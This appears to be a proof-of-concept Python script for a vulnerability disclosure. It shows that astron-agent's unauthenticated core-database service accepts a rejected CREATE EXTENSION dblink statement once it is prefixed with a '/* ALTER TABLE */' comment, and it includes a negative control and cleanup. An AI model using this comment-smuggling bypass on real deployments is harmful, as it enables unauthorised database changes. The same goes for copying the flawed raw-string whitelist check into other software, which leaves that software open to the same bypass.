#!/usr/bin/env python3
"""
astron-agent-poc V1 — CWE-184 — DDL whitelist bypass via comment smuggling
===========================================================================

The core-database service (`/xingchen-db/v1/*`, FastAPI) enforces a DDL whitelist,
but for statements SQLGlot models as `exp.Command` it decides the statement type by
searching the ORIGINAL SQL STRING for an allowlisted keyword:

    core/memory/database/api/v1/exec_ddl.py:60-80

        elif isinstance(parsed, Command):
            match = re.search(r"\\bALTER\\s+TABLE\\b", sql, re.IGNORECASE)   # line 71
            if match:
                full_type = match.group(0).upper()      # "ALTER TABLE"

Any comment containing `ALTER TABLE` therefore satisfies the guard, while the AST
root stays an unrelated command. The router also has no request authentication
(core/memory/database/main.py mounts the routers with no auth dependency), so any
network peer that can reach the service can drive it.

Demonstration
-------------
    1. create a throwaway database owned by this PoC     (POST /create_database)
    2. negative control: bare `CREATE EXTENSION ...`     -> rejected (code 25040)
    3. the same statement prefixed `/* ALTER TABLE */`   -> accepted (code 0)

Step 3 is the defect: the whitelist intended to reject the command and the only
thing that admits it is the keyword inside the comment.

Scope
-----
Creates one database named `astron_poc_v1_<4hex>` and installs the `dblink`
extension in it — a capability the service's own connection role already has. It
performs no file access, no cross-schema work and no data exfiltration. Cleanup
drops the extension and the database. Exits non-zero if the finding does not
reproduce.

Usage:
    python3 v1_ddl_whitelist_comment_smuggling.py --base http://localhost:7990 \\
                                                   --confirm-authorised
The service is not published to the host by the stock compose file; run the script
from inside the compose network (see ../env/build-and-run.md).
"""
import argparse
import json
import sys
import time
import urllib.error
import urllib.request

UID = "astron-agent-poc"
NAME_STEM = "astron_poc_v1_"

BYPASS_DDL = "/* ALTER TABLE */ CREATE EXTENSION IF NOT EXISTS dblink"
CONTROL_DDL = "CREATE EXTENSION IF NOT EXISTS dblink"
CLEANUP_DDL = "/* ALTER TABLE */ DROP EXTENSION IF EXISTS dblink"

CODE_OK = 0
CODE_DDL_NOT_ALLOWED = 25040  # "DDL syntax not allowed"


def die(msg, code=2):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(code)


def post_json(url, obj, timeout=60):
    req = urllib.request.Request(
        url, data=json.dumps(obj).encode(), method="POST",
        headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors="replace")
        try:
            return e.code, json.loads(raw)
        except ValueError:
            return e.code, {"raw": raw[:300]}
    except urllib.error.URLError as e:
        die(f"cannot reach {url}: {e.reason} — run inside the compose network", 3)


def main():
    ap = argparse.ArgumentParser(description="astron-agent V1 PoC (CWE-184)")
    ap.add_argument("--base", default="http://localhost:7990",
                    help="core-database base URL (default: http://localhost:7990)")
    ap.add_argument("--confirm-authorised", action="store_true",
                    help="confirm you are authorised to test this deployment")
    args = ap.parse_args()

    if not args.confirm_authorised:
        die("refusing to run without --confirm-authorised")

    base = args.base.rstrip("/")
    db_name = NAME_STEM + format(int(time.time()) & 0xFFFF, "04x")
    api = f"{base}/xingchen-db/v1"

    # ---- setup: a database this PoC owns
    print("== setup: create a throwaway database owned by this PoC ==")
    st, body = post_json(f"{api}/create_database",
                         {"database_name": db_name, "uid": UID,
                          "description": "astron-agent-poc v1, safe to drop"})
    print(f"  POST /create_database name={db_name} -> http {st}, code {body.get('code')}")
    if body.get("code") != CODE_OK or not body.get("data", {}).get("database_id"):
        die(f"could not create the test database: {json.dumps(body)[:300]}", 4)
    db_id = body["data"]["database_id"]
    print(f"  database_id = {db_id}")

    try:
        # ---- step 1: negative control — the whitelist does its job here
        print("\n== step 1: negative control — bare CREATE EXTENSION is rejected ==")
        st, body = post_json(f"{api}/exec_ddl",
                             {"database_id": db_id, "uid": UID, "ddl": CONTROL_DDL})
        print(f"  POST /exec_ddl {CONTROL_DDL!r}")
        print(f"    -> http {st}, code {body.get('code')}, message {body.get('message')!r}")
        if body.get("code") != CODE_DDL_NOT_ALLOWED:
            die(f"expected code {CODE_DDL_NOT_ALLOWED} for the bare command, got "
                f"{body.get('code')} — behaviour differs on this build", 5)

        # ---- step 2: the same command behind a comment
        print("\n== step 2: the same command behind a comment ==")
        st, body = post_json(f"{api}/exec_ddl",
                             {"database_id": db_id, "uid": UID, "ddl": BYPASS_DDL})
        print(f"  POST /exec_ddl {BYPASS_DDL!r}")
        print(f"    -> http {st}, code {body.get('code')}, message {body.get('message')!r}")
        if body.get("code") != CODE_OK:
            die(f"expected code {CODE_OK} for the comment-prefixed command, got "
                f"{body.get('code')} — V1 did not reproduce", 6)

        # ---- verdict
        print("\n== verdict ==")
        print("  V1 REPRODUCED. The whitelist accepted a command it exists to reject,")
        print("  because the allowlisted keyword it greps for sits inside a comment.")
        print("  SQLGlot 26.29.0 parses CREATE EXTENSION to exp.Command (key 'command'),")
        print("  so only the raw-string regex can admit it, and the comment satisfies it.")
        return 0
    finally:
        print("\n== cleanup ==")
        st, body = post_json(f"{api}/exec_ddl",
                             {"database_id": db_id, "uid": UID, "ddl": CLEANUP_DDL})
        print(f"  drop extension -> code {body.get('code')}")
        st, body = post_json(f"{api}/drop_database", {"database_id": db_id, "uid": UID})
        print(f"  drop database {db_id} -> code {body.get('code')}")


if __name__ == "__main__":
    sys.exit(main())
